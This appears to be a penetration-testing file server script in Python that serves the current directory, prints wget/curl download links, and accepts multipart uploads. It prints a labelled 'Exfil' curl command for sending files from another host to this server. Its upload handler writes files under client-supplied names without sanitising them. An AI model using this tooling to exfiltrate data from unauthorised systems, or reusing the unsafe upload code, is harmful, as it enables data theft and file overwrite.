#!/usr/bin/python3
import re
import subprocess
import os
from colorama import Fore, Back, Style
from signal import signal, SIGINT
from sys import exit
import http.server
import socketserver
import io
import cgi

SB = Style.BRIGHT
RS = Style.RESET_ALL

GN = Fore.GREEN
RD = Fore.RED
CY = Fore.CYAN
BL = Fore.BLUE
YW = Fore.YELLOW
WT = Fore.WHITE


def handler(signal_received, frame):
    #Usage: signal(SIGINT, handler)
    print(RD+ '\nCtrl + C detected, Closing application gracefully.' + RS)
    exit(0)
   

def Banner():
    os.system("clear")
    print(SB+GN+"Python FileServer with File upload functionality"+SB+RD+"(USE @ your own risk!!)" +RS)
    print(WT+ "Modified by "+SB+CY+ "pswalia2u" + RS + "\n" + "Inspired from " +SB+CY+ "Ac1D" + RS + " and https://gist.github.com/UniIsland/3346170\n")

def GetHostInfo():
    cmd = ["/bin/bash", "-c","hostname -I"]
    HOSTNAME=subprocess.run(cmd, stdout=subprocess.PIPE)
    return HOSTNAME


def HostFiles():
    #1. List files, Add to list files
    #2. Start python server for files
    #os.system("cd $pwd")
    print(BL+SB+ "\nCurrent Directory...\n" + RS)
    os.system("ls -lh --color")



def ShowMenu(CheckedIP):
    print("-" * 10 + SB+GN +" IP SELECTION " + RS + "-" * 10)
    selection = 0
    for ip in CheckedIP:
        print(f"{selection +1}: {ip}")
        selection +=1
    print("-" * 33)
    
    while True:
        Choice = input(f"Select ip in range (1, {selection})\n" + SB+RD + "$ " + RS)
        Choice = int(Choice)
        if Choice == 1:
            return CheckedIP[Choice -1]
        elif Choice == 2:
            return CheckedIP[Choice -1]
        elif Choice == 3:
            return CheckedIP[Choice -1]
        elif Choice == 4:
            return CheckedIP[Choice -1]
        elif Choice == 5:
            return CheckedIP[Choice -1]
        else:
            print(RD+ "Invalid Choice, Try again!" + RS)
    
  
def IPChoice():
    Hostname= GetHostInfo()
    HostnameSplits= Hostname.stdout.decode().split(" ")
    checkedIP = []
    for ip in HostnameSplits:
        res = re.match("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)
        if res:
            checkedIP.append(ip)      
    

    if len(checkedIP) <= 1:
        return checkedIP
    else:
        return ShowMenu(checkedIP)

def RunServer(ip):
    Banner()
    files = os.listdir('.')
    global portSel #Global variable
    portSel = input("Enter port for Python server (Press Enter for default: 8000): ")
    method = ""
    print(GN + SB+f"\n File upload/Exfil file: \n curl -F 'file=@<FILENAME>' http://{ip}:{portSel}/"+RS+"\n")
    while True:
        
        wgetOrCurl = input("Method: Wget / Curl (press Enter Default (wget) or 'c' for curl: ")
        if wgetOrCurl == "c":
            method = "curl"
            break
        elif wgetOrCurl == "w":
            method = "wget"
            break 
        else:
            method = "wget"
            break
            

    if not portSel: portSel = 8000
    print(BL+SB+ "\nCopy Links...\n" + RS)
    for file in files:        
        if not file.startswith(".") and not os.path.isdir(file):
            if method == "wget":
                print(GN + SB+ f"\t{method} http://{''.join(ip)}:{portSel}/{file}" + RS)
            else:
                print(GN + SB+ f"\t{method} http://{''.join(ip)}:{portSel}/{file} --output {file}" + RS)
    HostFiles()
    print("\n")
    print(SB+GN+ "Starting Server" + RS)
    
    
    
#    os.system(f"sudo python3 -m http.server {portSel}")


class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):        
        r, info = self.deal_post_data()
        print(r, info, "by: ", self.client_address)
        f = io.BytesIO()
        if r:
            f.write(b"Success\n")
        else:
            f.write(b"Failed\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()      

    def deal_post_data(self):
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'], })
            print (type(form))
            try:
                if isinstance(form["file"], list):
                    for record in form["file"]:
                        open("./%s"%record.filename, "wb").write(record.file.read())
                else:
                    open("./%s"%form["file"].filename, "wb").write(form["file"].file.read())
            except IOError:
                    return (False, "Can't create file to write, do you have permission to write?")
        return (True, "Files uploaded")



if __name__ == '__main__':
    signal(SIGINT, handler)
    Banner()
    IPADDRESS = IPChoice()
    RunServer(IPADDRESS)
Handler = CustomHTTPRequestHandler
portSel=int(portSel)
with socketserver.TCPServer(("", portSel), Handler) as httpd:
    print("serving at port", portSel)
    httpd.serve_forever()